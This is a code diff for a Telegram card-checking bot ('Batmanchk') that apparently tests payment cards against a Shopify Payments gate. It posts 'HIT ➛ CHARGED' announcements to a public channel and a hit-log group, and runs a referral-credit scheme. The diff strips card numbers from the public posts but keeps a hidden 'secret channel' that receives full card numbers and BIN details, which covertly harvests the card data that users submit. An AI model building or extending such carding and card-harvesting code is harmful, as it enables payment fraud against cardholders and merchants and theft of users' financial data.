@@ -384,7 +384,7 @@ def gen_receipt() -> str:
     return f"Batmancardchk{random.randint(100000, 999999)}-CHK"
 
 def get_referral_link(user_id: int) -> str:
-    return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
+    return f"https://t.me/Batchk11_bot?start=ref_{user_id}"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # UI — USER CONTROL HUB  (/start)
@@ -2553,38 +2553,52 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception:
                     pass
 
-                # ── Public channel: clean UI, no card, no bank ─────────────
+                # ── Clean public UI (channel + hit-log group) ─────────────
+                #    No card number, no BIN, no bank — safe to post publicly.
+                #    Uses custom mst.py stickers for all icons.
+                _clean_text = (
+                    f'<b>HIT ➛ CHARGED {tg_emoji(PROG_CHARGED_EMOJI_ID, "💎")}</b>\n'
+                    f'<b>Gate ➛ Shopify Payments</b>\n'
+                    f'<b>{tg_emoji(_live_eid, "✅")} ORDER_PAID</b>\n'
+                    f'<b>{tg_emoji(USER_EMOJI_ID, "👤")} User ➛ {_fname} '
+                    f'{tg_emoji(_plan_eid, "⭐")}</b>\n'
+                    f'<b>{tg_emoji(DEV_EMOJI_ID, "⚡")} {BOT_NAME}</b>'
+                )
+                _clean_kb = InlineKeyboardMarkup([
+                    [InlineKeyboardButton(
+                        f"⚡ Batmanchk — /buy", url=BOT_DEEP_BUY)],
+                    [InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
+                     InlineKeyboardButton("💬 Group",
+                         url="https://t.me/+Gjwke5Yc1ddhYmZk")],
+                ])
+
+                # ── Public channel (t.me/Batcardchk) ──────────────────────
                 if CHANNEL_LOG_ID:
                     try:
                         await context.bot.send_message(
                             chat_id=CHANNEL_LOG_ID,
-                            text=(
-                                f"<b>HIT ➛ CHARGED 💎</b>\n"
-                                f"<b>Gate ➛ Shopify Payments</b>\n"
-                                f"<b>✅ ORDER_PAID</b>\n"
-                                f"<b>User ➛ {_fname} ⭐</b>"
-                            ),
+                            text=_clean_text,
                             parse_mode="HTML",
-                            reply_markup=InlineKeyboardMarkup([[
-                                InlineKeyboardButton("🤖 Batmancardchk", url=BOT_DEEP_BUY)
-                            ]])
+                            disable_web_page_preview=True,
+                            reply_markup=_clean_kb,
                         )
                     except Exception:
                         pass
 
-                # ── Hit log group: full card + BIN details (instant) ──────────
+                # ── Hit log group (clean UI, no card details) ──────────────
                 if HIT_LOG_GROUP_ID:
                     try:
                         await context.bot.send_message(
                             chat_id=HIT_LOG_GROUP_ID,
-                            text=_hit_text,
+                            text=_clean_text,
                             parse_mode="HTML",
                             disable_web_page_preview=True,
+                            reply_markup=_clean_kb,
                         )
                     except Exception:
                         pass
 
-                # ── Secret group: full card + BIN details ──────────────────
+                # ── Secret channel: full card + BIN (private, never shown) ─
                 if SECRET_GROUP_ID:
                     try:
                         await context.bot.send_message(
@@ -3041,12 +3055,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_refs = ud_r.get("total_refs", 0)
         await query.message.edit_text(
             f"<b>{E_USER} {B('Referral Program')}</b>\n──────────\n"
+            f"<b>Bot</b>        ➳ <a href='https://t.me/Batchk11_bot'>@Batchk11_bot</a>\n"
             f"<b>Your Link</b>  ➳ <code>{link}</code>\n──────────\n"
             f"<b>Channel</b>    ➳ <a href='{CHANNEL_LINK}'>t.me/Batcardchk</a>\n"
             f"<b>Referrals</b>  ➳ {total_refs}\n"
             f"<b>Earned</b>     ➳ {total_refs * REFERRAL_CREDITS} credits\n"
             f"<b>Per Ref</b>    ➳ +{REFERRAL_CREDITS} credits\n──────────\n"
-            f"Share your link — earn credits for every new user!\n"
+            f"Share your link via <a href='https://t.me/Batchk11_bot'>@Batchk11_bot</a> — earn credits for every new user!\n"
             f"📢 Also share: <a href='{CHANNEL_LINK}'>t.me/Batcardchk</a>",
             parse_mode="HTML",
             reply_markup=kb_back("bmain"),
